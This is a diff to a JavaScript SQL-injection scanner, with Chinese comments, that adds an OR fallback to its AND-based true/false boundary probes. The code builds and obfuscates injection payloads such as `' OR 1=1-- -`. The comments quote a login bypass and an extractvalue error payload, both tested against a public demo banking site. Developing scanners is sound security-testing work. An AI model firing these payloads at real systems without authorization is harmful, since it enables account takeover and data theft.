@@ -122,6 +122,11 @@ export async function probeBoundary(ctx) {
       if (similarHits.length > 1) {
         const recheckPrefix = await this._boundaryOrRecheck(ctx, orig, similar, similarHits, PROBE_OPTS);
         if (recheckPrefix !== null) return recheckPrefix;
+        // [D210 已回滚] 曾在此追加「用 offBaseline 候选做真假对差分」—— 它确实能让本目标探出闭合前缀 `'`，
+        // 但**同时把 error 通道的假阳放大了**：boundary 一旦非空，所有点的 error 探针都带上 `'`，
+        // 而 error 判据只认「响应里有 SQL 错误签名」，区分不了「payload 引起」与「这个参数的引号引起」
+        //（实测 btnSubmit：`Login' AND extractvalue(…)-- -` 返回 8360 正常页、零语法错误，扫描器却判 error）。
+        // 真机三连从 2/2/2 恶化到 4/4/2 ⇒ 按「宁可漏报不给假阳」回滚，配套的 error 判据加固见 TODO D211。
       }
       if (similarHits.length > 0) return similarHits[0].value.prefix;
     } catch {
@@ -255,16 +260,26 @@ export async function _boundaryPairDiff(ctx, orig, candidates, PROBE_OPTS) {
       if (!wave.length) continue;
       const pairHits = await Promise.allSettled(
         wave.map(async (prefix) => {
-          const tp = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=1-- -`);
-          const fp = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=2-- -`);
-          const [t, f] = await Promise.all([
-            this.send(httpClient, ctx, this.buildRequest(target, point, tp), PROBE_OPTS),
-            this.send(httpClient, ctx, this.buildRequest(target, point, fp), PROBE_OPTS),
-          ]);
-          const tc = stripEchoedPayload(String(t?.data ?? ''), tp);
-          const fc = stripEchoedPayload(String(f?.data ?? ''), fp);
-          // 两侧都空（如全程 404）不构成信号
-          return { prefix, ok: tc.length > 0 && !this.chunkedSimilar(tc, fc) };
+          // [D210] AND 优先、OR 兜底。原因同 D209：参数**原值查不到行**时 AND 恒假
+          //（`WHERE uid='ghost' AND 1=1` 仍是空集），真/假两侧都落同一页 ⇒ 差分无信号 ⇒
+          // 闭前缀探测失败 ⇒ `point.boundary=''` ⇒ union/提取全部拿不到闭合。
+          // 真机证据（demo.testfire.net POST /doLogin，testuser 不是有效用户）：
+          //   testuser' AND 1=1-- -  → login.jsp   |  testuser' AND 1=2-- -  → login.jsp（无差异）
+          //   testuser' OR  1=1-- -  → bank/main.jsp |  testuser' OR  1=2-- -  → login.jsp（有差异）
+          // AND 命中即早退，正常目标零额外开销；只有空基线目标才多花一组请求。
+          for (const op of ['AND', 'OR']) {
+            const tp = this.obfuscateValue(ctx, `${orig}${prefix} ${op} 1=1-- -`);
+            const fp = this.obfuscateValue(ctx, `${orig}${prefix} ${op} 1=2-- -`);
+            const [t, f] = await Promise.all([
+              this.send(httpClient, ctx, this.buildRequest(target, point, tp), PROBE_OPTS),
+              this.send(httpClient, ctx, this.buildRequest(target, point, fp), PROBE_OPTS),
+            ]);
+            const tc = stripEchoedPayload(String(t?.data ?? ''), tp);
+            const fc = stripEchoedPayload(String(f?.data ?? ''), fp);
+            // 两侧都空（如全程 404）不构成信号
+            if (tc.length > 0 && !this.chunkedSimilar(tc, fc)) return { prefix, ok: true };
+          }
+          return { prefix, ok: false };
         })
       );
       const bestPair = /** @type {any} */ (pairHits.find((r) => r.status === 'fulfilled' && r.value.ok));
